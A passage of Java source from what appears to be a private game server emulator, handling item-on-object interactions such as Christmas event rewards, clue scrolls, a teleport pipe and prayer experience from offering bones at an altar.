					player.setNextAnimation(new Animation(833));			  
					
					player.getInventory().addItem(2801, 1);  //clue scroll.
					player.getInventory().addItem(15426, 1);  //candy cane.
					player.getInventory().addItem(20077, 1);  //candy cane.
					
					player.getInventory().deleteItem(new Item(4671, 28));
					player.getInventory().refresh();
					player.sendMessage("<col=0000FF>----------------------------------------------------------------");
					player.sendMessage("<col=FF00BF>Congratulations on completing the easy HNS. Only do it once.");
					player.sendMessage("<col=FF00BF>Due to stop multiple HNS claiming, You name and ip is recorded.");
					player.sendMessage("<col=0000FF>----------------------------------------------------------------");
					player.addStopDelay(4);
					
					
	//pyramid door.
		} else if (itemId == 4671 && object.getId() == 6546) { //diamond on door.
					
					player.setNextAnimation(new Animation(833));			  
					
					player.getInventory().addItem(2801, 1);  //clue scroll.
					player.getInventory().addItem(15426, 1);  //candy cane.
					player.getInventory().addItem(20077, 1);  //candy cane.
					
					player.getInventory().deleteItem(new Item(4671, 28));
					player.getInventory().refresh();
					player.sendMessage("<col=0000FF>----------------------------------------------------------------");
					player.sendMessage("<col=FF00BF>Congratulations on completing the easy HNS. Only do it once.");
					player.sendMessage("<col=FF00BF>Due to stop multiple HNS claiming, You name and ip is recorded.");
					player.sendMessage("<col=0000FF>----------------------------------------------------------------");
					player.addStopDelay(4);
		
		//GWD altars
		} else if (itemId == 18625 && object.getId() == 26289) { //spade ons andpit
					
					player.setNextAnimation(new Animation(3170));			  
					
					player.getInventory().addItem(2811, 1);  //clue scroll.
					player.getInventory().deleteItem(new Item(18625, 28));
					player.getInventory().refresh();
					player.addStopDelay(4);
					
		} else if (itemId == 18625 && object.getId() == 26288) { //spade ons andpit
					
					player.setNextAnimation(new Animation(3170));			  
					
					player.getInventory().addItem(2811, 1);  //clue scroll.
					player.getInventory().deleteItem(new Item(18625, 28));
					player.getInventory().refresh();
					player.addStopDelay(4);
					
					
		} else if (itemId == 18625 && object.getId() == 26287) { //spade ons andpit
					
					player.setNextAnimation(new Animation(3170));			  
					
					player.getInventory().addItem(2811, 1);  //clue scroll.
					player.getInventory().deleteItem(new Item(18625, 28));
					player.getInventory().refresh();
					player.addStopDelay(4);
					
					
		} else if (itemId == 18625 && object.getId() == 26286) { //spade on sandpit
					
					player.setNextAnimation(new Animation(3170));			  
					
					player.getInventory().addItem(2811, 1);  //clue scroll.
					player.getInventory().deleteItem(new Item(18625, 28));
					player.getInventory().refresh();
					player.addStopDelay(4);
					
					
		//Digsite boat
		} else if (itemId == 18628 && object.getId() == 5584) { //Boat
					
					player.setNextAnimation(new Animation(331));			  
					
					player.getInventory().addItem(2835, 1);  //clue scroll.
					player.getInventory().deleteItem(new Item(18628, 28));
					player.getInventory().refresh();
					player.addStopDelay(4);
					
					
		//final event
		
		} else if (itemId == 11054 && object.getId() == 6648) { //shield 
					
					player.setNextGraphics(new Graphics(2928));
                    player.setNextAnimation(new Animation(1877));			  

					player.getInventory().addItem(12929, 1);  //shield 100
					player.getInventory().deleteItem(new Item(11054, 28));
					for (Player players : World.getPlayers()) 
					players.getPackets().sendGameMessage("<col=CC3300>Someone has Finished making the Christmas HNS Shield!");
					player.getInventory().refresh();
					player.addStopDelay(4);
					
	} else if (itemId == 11952 && object.getId() == 38658) { //sword
					
					player.setNextGraphics(new Graphics(2928));
                    player.setNextAnimation(new Animation(1877));
					player.getInventory().addItem(20543, 1);  //sword
					player.getInventory().deleteItem(new Item(11952, 28));
					for (Player players : World.getPlayers()) 
					players.getPackets().sendGameMessage("<col=CC3300>Someone has Finished making  the Christmas HNS Sword!");
					player.getInventory().refresh();
					player.addStopDelay(4);
		
		//Xmas End
				
				
	//pipe
			//tele
		} else if (itemId == 10872 && object.getId() == 871) {
						player.getPackets().sendGameMessage("The Power Pipe activates");
						player.getInventory().deleteItem(new Item(10872, 1));
						
                                                player.getPackets().sendSound(2738, 0, 1);
												player.setNextGraphics(new Graphics(2929));
                                                player.setNextAnimation(new Animation(836));
												player.addStopDelay(3);
												player.useStairs(10584, new WorldTile(2320,9804, 0), 2, 3,
												"You get zapped and teleported. ");
                                                player.getInventory().refresh();
					
		
                                                
												
			
	//G altar XP is x40 i think


					//Dragon 536
					} else if (itemId == 536 && object.getId() == 409) {
						player.getPackets().sendGameMessage("You pray at the gods");
						player.getInventory().deleteItem(new Item(536, 1));
						player.getSkills().addXp(Skills.PRAYER, 1000);
                                                player.getPackets().sendSound(2738, 0, 1);
                                                player.setNextAnimation(new Animation(896));
                                                player.setNextGraphics(new Graphics(624));
												player.addStopDelay(3);
                                                player.getInventory().refresh();
								
					
					//big bones532
					} else if (itemId == 532 && object.getId() == 409) {
						player.getPackets().sendGameMessage("You pray at the gods");
						player.getInventory().deleteItem(new Item(532, 1));
						player.getSkills().addXp(Skills.PRAYER, 400);
                                                player.getPackets().sendSound(2738, 0, 1);
                                                player.setNextAnimation(new Animation(896));
                                                player.setNextGraphics(new Graphics(624));
												player.addStopDelay(3);
                                                player.getInventory().refresh();								
					
					//baby drag534
					} else if (itemId == 534 && object.getId() == 409) {
						player.getPackets().sendGameMessage("You pray at the gods");
						player.getInventory().deleteItem(new Item(534, 1));
						player.getSkills().addXp(Skills.PRAYER, 425);
                                                player.getPackets().sendSound(2738, 0, 1);
                                                player.setNextAnimation(new Animation(896));
                                                player.setNextGraphics(new Graphics(624));
												player.addStopDelay(3);
                                                player.getInventory().refresh();								
					
					//normal bones526
					} else if (itemId == 526 && object.getId() == 409) {
						player.getPackets().sendGameMessage("You pray at the gods");
						player.getInventory().deleteItem(new Item(526, 1));
						player.getSkills().addXp(Skills.PRAYER, 200);
                                                player.getPackets().sendSound(2738, 0, 1);
                                                player.setNextAnimation(new Animation(896));
                                                player.setNextGraphics(new Graphics(624));
												player.addStopDelay(3);
                                                player.getInventory().refresh();								
					
					//frosts18830
					} else if (itemId == 18830 && object.getId() == 409) {
						player.getPackets().sendGameMessage("You pray at the gods");
						player.getInventory().deleteItem(new Item(18830, 1));
						player.getSkills().addXp(Skills.PRAYER, 2000);
                                                player.getPackets().sendSound(2738, 0, 1);
                                                player.setNextAnimation(new Animation(896));
                                                player.setNextGraphics(new Graphics(624));
												player.addStopDelay(3);
                                                player.getInventory().refresh();								
					
					//joger3125
					} else if (itemId == 3125 && object.getId() == 409) {
						player.getPackets().sendGameMessage("You pray at the gods");
						player.getInventory().deleteItem(new Item(3125, 1));
						player.getSkills().addXp(Skills.PRAYER, 500);
                                                player.getPackets().sendSound(2738, 0, 1);
                                                player.setNextAnimation(new Animation(896));
                                                player.setNextGraphics(new Graphics(624));
												player.addStopDelay(3);
                                                player.getInventory().refresh();								
					
					
					
					//ourg4834
					} else if (itemId == 4834 && object.getId() == 409) {
						player.getPackets().sendGameMessage("You feel the power of Bandos!");
						player.getInventory().deleteItem(new Item(4834, 1));
						player.getSkills().addXp(Skills.PRAYER, 2500);
                                                player.getPackets().sendSound(2738, 0, 1);
                                                player.setNextAnimation(new Animation(14788));
                                                player.setNextGraphics(new Graphics(624));
												player.setNextGraphics(new Graphics(2369));
												player.addStopDelay(3);
                                                player.getInventory().refresh();								
					}
					
					
					
	//G end				
					
					else if (object.getId() == 733 || object.getId() == 64729) {
						player.setNextAnimation(new Animation(PlayerCombat
								.getWeaponAttackEmote(-1, 0)));
						slashWeb(player, object);
					} else if (objectDef.name.toLowerCase().contains("range")
							|| objectDef.name.toLowerCase().contains("stove")
							|| id == 2732) {
						Cookables cook = Cooking.isCookingSkill(item);
						if (cook != null) {
							player.getDialogueManager().startDialogue(
									"CookingD", cook, object);
						}
					} else {
						player.getPackets().sendGameMessage(
								"Nothing interesting happens.");
						if (Settings.DEBUG)
							System.out.println("item on object: " + id);
					}
				}
			}
		}, objectDef.getSizeX(), objectDef.getSizeY(), object.getRotation()));
	}

	
}